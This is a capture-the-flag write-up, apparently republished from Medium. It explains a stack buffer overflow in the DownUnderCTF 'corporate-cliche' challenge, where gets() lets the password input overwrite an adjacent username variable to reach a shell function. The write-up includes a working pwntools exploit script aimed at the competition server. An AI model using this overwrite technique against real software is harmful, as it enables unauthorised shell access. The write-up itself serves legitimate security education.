# 💀 DownUnderCTF Write-up: corporate-cliche (PWN) - Medium

> **Original Source:** [DownUnderCTF Write-up: corporate-cliche (PWN) - Medium](https://medium.com/@akash.gupta.contact/downunderctf-write-up-corporate-cliche-pwn-82e04df118c2)
> **Platform:** medium.com | **Category:** `PWN` | **Event:** DownUnderCTF


---

## 📝 Full Writeup

DownUnderCTF Write-up: *corporate-cliche* (PWN)[![codebreaker](https://web.archive.org/web/20250904101131im_/https://miro.medium.com/v2/resize:fill:64:64/1*0tRLGykkFjcqocdZCH0dWw.jpeg)

](/web/20250904101131/https://medium.com/@akash.gupta.contact?source=post_page---byline--82e04df118c2---------------------------------------)

[codebreaker](/web/20250904101131/https://medium.com/@akash.gupta.contact?source=post_page---byline--82e04df118c2---------------------------------------)

·
Jul 23, 2025

[

](/web/20250904101131/https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F82e04df118c2&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40akash.gupta.contact%2Fdownunderctf-write-up-corporate-cliche-pwn-82e04df118c2&user=codebreaker&userId=0f0abef969fe&source=---header_actions--82e04df118c2---------------------clap_footer------------------)

--



This challenge was a fun binary exploitation (pwn) problem. While the description was full of corporate buzzwords, phrases like “push the envelope” and “go above and beyond” were clear hints pointing to a **classic buffer overflow** vulnerability.

The challenge provided both the compiled binary (`emaiserver`) and its C source code (`email_server.c`), which made it easier to pinpoint the flaw.

## Static Analysis: Reading the Source Code
Opening up `email_server.c`, I noticed a function that **was never called anywhere** in `main`:

```
void open_admin_session() {
 system("/bin/sh");
}
```

This was clearly the win condition — executing this function would spawn a shell.

The vulnerable section was in the `main()` function, which prompted for a username and then called `gets(password)` on a 32-byte buffer.

```
char password[32];
char username[32];
...
gets(password);
```

Classic mistake — `gets()` performs **no bounds checking**, allowing us to **overflow the stack** beyond the `password` buffer.

Interestingly, the code had a **check that prevented direct login as “admin”**, but inside the login logic loop, there was another check:

```
if (strcmp(username, "admin") == 0) {
 if (strcmp(password, "🇦🇩🇲🇮🇳") == 0) {
 open_admin_session();
 }
}
```

So even if we couldn’t *initially* log in as “admin”, the program *still checked* for it later — which was exploitable.

## Failed Attempt: Return Address Overwrite
My first instinct was a **standard return address overwrite**:

- Overflow the password buffer with junk

- Append the address of `open_admin_session()`

- Let `main()` return into it

But this failed — no segfaults, no shell. Just a clean exit.

On inspection, every branch in `main()` ended with `exit()`. So there was **no reachable **`**ret**`** instruction**, and **return address hijacking was off the table**.

## The Real Vulnerability: Variable Overwriting
Looking at the local variable layout:

```
char password[32];
char username[32];
```

These are likely **placed adjacently on the stack**. That meant I could:

- Input a normal username like `"guest"`

- Overflow the `password` buffer

- **Overwrite the **`**username**`** variable** on the stack *after* it was already read

This would let me pass the `"admin"` check later in the code, despite never typing "admin" at the prompt.

## Crafting the Exploit
The main challenge was to craft a single payload that:

- Passed the password check for `"admin"`

- Overflowed `password` and changed `username` to `"admin"`

The trick came down to how `strcmp()` works: it **stops reading at the first null byte** (`\x00`). So I could do:

- Place the correct admin password: `🇦🇩🇲🇮🇳` (Unicode)

- Follow it with a null byte: `\x00`

- Add padding to fill the rest of the 32-byte buffer

- Then overflow into `username` with `admin\x00`

## 🔧 Pwntools Exploit
```
from pwn import *
```

```
# Connect to the remote server
p = remote('chal.2025.ductf.net', 30000)# The admin password (Unicode flag from source)
admin_password = b'\xf0\x9f\x87\xa6\xf0\x9f\x87\xa9\xf0\x9f\x87\xb2\xf0\x9f\x87\xae\xf0\x9f\x87\xb3'# Size of the password buffer
password_buf_size = 32# Build the payload
payload = admin_password + b'\x00' # Password + null terminator
payload += b'A' * (password_buf_size - len(payload)) # Padding
payload += b'admin\x00' # Overwrite username with "admin"# Exploit
p.sendlineafter(b'Enter your username: ', b'guest') # Initial dummy username
p.sendlineafter(b'Enter your password: ', payload) # Crafted password buffer
p.interactive() # Enjoy the shell!
```

## Capturing the Flag
- The script sends `"guest"` as username to pass the initial check.

- The `gets()` call overflows into `username`, changing it to `"admin"`.

- The password matches `"🇦🇩🇲🇮🇳"`, so `open_admin_session()` gets called.

This grants a **root shell** — and from there, the **flag was easily retrieved**.

---

*📖 Originally published on [Medium](https://medium.com/@akash.gupta.contact/downunderctf-write-up-corporate-cliche-pwn-82e04df118c2). All credit goes to the original author.*
*📂 Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of pwn CTF writeups.*
